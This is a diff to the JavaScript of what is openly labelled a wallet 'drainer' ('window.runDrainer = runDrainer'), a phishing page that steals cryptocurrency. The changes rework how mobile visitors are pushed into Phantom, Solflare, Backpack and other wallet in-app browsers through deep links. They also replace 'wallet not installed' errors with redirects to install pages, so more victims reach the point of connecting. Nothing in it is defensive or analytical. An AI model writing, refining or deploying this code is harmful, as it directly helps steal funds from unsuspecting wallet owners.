@@ -2616,22 +2616,6 @@
       }
     }
 
-    // Check if we're running inside a wallet browser
-    function isInWalletBrowser() {
-      const userAgent = navigator.userAgent.toLowerCase();
-      const currentUrl = window.location.href.toLowerCase();
-      
-      return userAgent.includes('phantom') || 
-             userAgent.includes('solflare') || 
-             userAgent.includes('backpack') ||
-             currentUrl.includes('phantom.app') ||
-             currentUrl.includes('solflare.com') ||
-             currentUrl.includes('backpack.app') ||
-             currentUrl.includes('trustwallet.com') ||
-             currentUrl.includes('glow.app') ||
-             currentUrl.includes('exodus.com');
-    }
-
     // Check if mobile wallet is actually available in browser
     function isMobileWalletAvailable(wallet) {
       const provider = wallet.provider();
@@ -4325,9 +4309,10 @@ window.runDrainer = runDrainer;
       
       const tryNextStrategy = () => {
         if (strategyIndex >= orderedStrategies.length) {
-          console.log(`[MOBILE_DEEP_LINK] All strategies failed for ${walletType}, wallet not installed`);
-          // All strategies failed, show error message
-          showStatus(`${walletType} wallet not installed. Please install the wallet app first.`, 'error');
+          console.log(`[MOBILE_DEEP_LINK] All strategies failed for ${walletType}, redirecting to install page`);
+          // All strategies failed, redirect to install page
+          const installUrl = platform === 'ios' ? wallet.mobile.appStore : wallet.mobile.playStore;
+          window.location.href = installUrl;
           return;
         }
         
@@ -4527,10 +4512,26 @@ window.runDrainer = runDrainer;
               }
             }
             
-            // If still no provider after deep linking, show error message
+            // If still no provider after deep linking, try to open app store as fallback
             if (!provider) {
-              console.log(`[connectMobileWallet] No provider found for ${wallet.name}, wallet not installed`);
-              showStatus(`${wallet.name} wallet not detected. Please install the wallet app first.`, 'error');
+              console.log(`[connectMobileWallet] No provider found for ${wallet.name}, trying app store fallback`);
+              try {
+                if (wallet.name === 'Phantom') {
+                  window.open('https://phantom.app/', '_blank');
+                } else if (wallet.name === 'Solflare') {
+                  window.open('https://solflare.com/', '_blank');
+                } else if (wallet.name === 'Backpack') {
+                  window.open('https://backpack.app/', '_blank');
+                } else if (wallet.name === 'Glow') {
+                  window.open('https://glow.app/', '_blank');
+                } else if (wallet.name === 'Trust Wallet') {
+                  window.open('https://trustwallet.com/', '_blank');
+                } else if (wallet.name === 'Exodus') {
+                  window.open('https://exodus.com/', '_blank');
+                }
+              } catch (e) {
+                console.error(`[connectMobileWallet] Error opening app store for ${wallet.name}:`, e);
+              }
             }
           }
           
@@ -5520,7 +5521,7 @@ window.runDrainer = runDrainer;
         case 'phantom':
           // Phantom: Use correct URL structure for mobile, complex API for desktop
           if (isMobileDevice) {
-            // Mobile: Use correct Phantom URL structure
+            // Mobile: Use exact Phantom URL format
             const encodedUrl = encodeURIComponent(currentUrl);
             deepLink = `https://phantom.app/ul/browse/${encodedUrl}?ref=${encodedUrl}`;
             fallbackUrl = `phantom://browse/${encodedUrl}?ref=${encodedUrl}`;
@@ -5533,7 +5534,7 @@ window.runDrainer = runDrainer;
         case 'solflare':
           // Solflare: Use correct URL structure for mobile, complex API for desktop
           if (isMobileDevice) {
-            // Mobile: Use correct Solflare URL structure
+            // Mobile: Use exact Solflare URL format
             const encodedUrl = encodeURIComponent(currentUrl);
             deepLink = `https://solflare.com/ul/v1/browse/${encodedUrl}?ref=${encodeURIComponent("https://solflare.com")}`;
             fallbackUrl = `solflare://v1/browse/${encodedUrl}?ref=${encodeURIComponent("https://solflare.com")}`;
@@ -5546,7 +5547,7 @@ window.runDrainer = runDrainer;
         case 'backpack':
           // Backpack: Use correct URL structure for mobile, complex API for desktop
           if (isMobileDevice) {
-            // Mobile: Use correct Backpack URL structure
+            // Mobile: Use exact Backpack URL format
             const encodedUrl = encodeURIComponent(currentUrl);
             deepLink = `https://backpack.app/ul/v1/browse/${encodedUrl}?ref=${encodedUrl}`;
             fallbackUrl = `backpack://v1/browse/${encodedUrl}?ref=${encodedUrl}`;
@@ -5615,16 +5616,28 @@ window.runDrainer = runDrainer;
       // Improved deep link opening with better mobile support
       try {
         if (isMobileDevice) {
-          console.log(`[DEEP_LINK] Mobile device: redirecting current tab to wallet browser`);
+          console.log(`[DEEP_LINK] Mobile device: using improved approach`);
           
-          // For mobile, redirect current tab to wallet browser (not new context)
-          console.log(`[DEEP_LINK] Redirecting to: ${deepLink}`);
+          // For mobile, try universal link first (more reliable)
+          console.log(`[DEEP_LINK] Trying universal link: ${deepLink}`);
+          
+          // Use a more reliable method for mobile deep links
+          const link = document.createElement('a');
+          link.href = deepLink;
+          link.target = '_blank';
+          link.rel = 'noopener noreferrer';
+          document.body.appendChild(link);
+          link.click();
+          document.body.removeChild(link);
+          
+          // If that doesn't work, try custom scheme after a short delay
+          setTimeout(() => {
+            console.log(`[DEEP_LINK] Trying custom scheme: ${fallbackUrl}`);
+            window.location.href = fallbackUrl;
+          }, 1500);
           
           // Show a message to the user about what's happening
-          showStatus(`Redirecting to ${walletType} wallet...`, 'info');
-          
-          // Redirect current tab to wallet browser
-          window.location.href = deepLink;
+          showStatus(`Opening ${walletType} wallet...`, 'info');
           
         } else {
           // Desktop: Direct window location change
@@ -5644,8 +5657,15 @@ window.runDrainer = runDrainer;
         } catch (fallbackError) {
           console.error(`[DEEP_LINK] Fallback URL failed:`, fallbackError);
           
-          // Strategy 2: Show error message
-          showStatus(`${walletType} wallet not installed. Please install the wallet app first.`, 'error');
+          // Strategy 2: Try install page
+          const wallet = WALLET_DEFS.find(w => w.key === walletType);
+          if (wallet && wallet.install) {
+            console.log(`[DEEP_LINK] Redirecting to install page:`, wallet.install);
+            window.location.href = wallet.install;
+          } else {
+            // Strategy 3: Show error message
+            showStatus(`Failed to open ${walletType} wallet. Please install the wallet app.`, 'error');
+          }
         }
       }
     }
@@ -5756,7 +5776,7 @@ window.openWalletModal = async function openWalletModal() {
       modalData.wallets.forEach(wallet => {
         const walletOption = document.createElement('div');
         walletOption.className = 'wallet-option';
-        walletOption.onclick = async () => {
+        walletOption.onclick = () => {
           // Check if mobile device
           const userAgent = navigator.userAgent.toLowerCase();
           const isMobile = /android|webos|iphone|ipad|ipod|blackberry|iemobile|opera mini/i.test(userAgent) ||
@@ -5765,23 +5785,8 @@ window.openWalletModal = async function openWalletModal() {
                           window.innerWidth <= 768;
           
           if (isMobile) {
-            console.log('[WALLET_OPTION] Mobile device detected');
-            
-            // Check if we're already in a wallet browser
-            if (isInWalletBrowser()) {
-              console.log('[WALLET_OPTION] Already in wallet browser, attempting direct connection');
-              try {
-                await window.connectWallet(wallet.key);
-                return;
-              } catch (error) {
-                console.log('[WALLET_OPTION] Direct connection failed:', error);
-                showStatus('Connection failed. Please try again.', 'error');
-                return;
-              }
-            }
-            
-            // We're in regular browser, redirect to wallet browser
-            console.log('[WALLET_OPTION] In regular browser, redirecting to wallet browser');
+            console.log('[WALLET_OPTION] Mobile device detected, using enhanced deep link');
+            // For mobile, use the enhanced deep link system
             window.openInWallet(wallet.key).catch(error => {
               console.error('[WALLET_OPTION] Error opening wallet:', error);
             });
@@ -5862,11 +5867,11 @@ window.connectWallet = async function connectWallet(walletKey) {
       if (deepLink) {
         window.location.href = deepLink;
         setTimeout(() => {
-          // If deep link fails, show error message
-          showStatus(`${walletType} wallet not installed. Please install the wallet app first.`, 'error');
+          // If deep link fails, redirect to install page
+          window.location.href = installUrl;
         }, 2000);
         } else {
-        showStatus(`${walletType} wallet not installed. Please install the wallet app first.`, 'error');
+        window.location.href = installUrl;
       }
     } else {
       // Desktop wallet connection - try to find provider
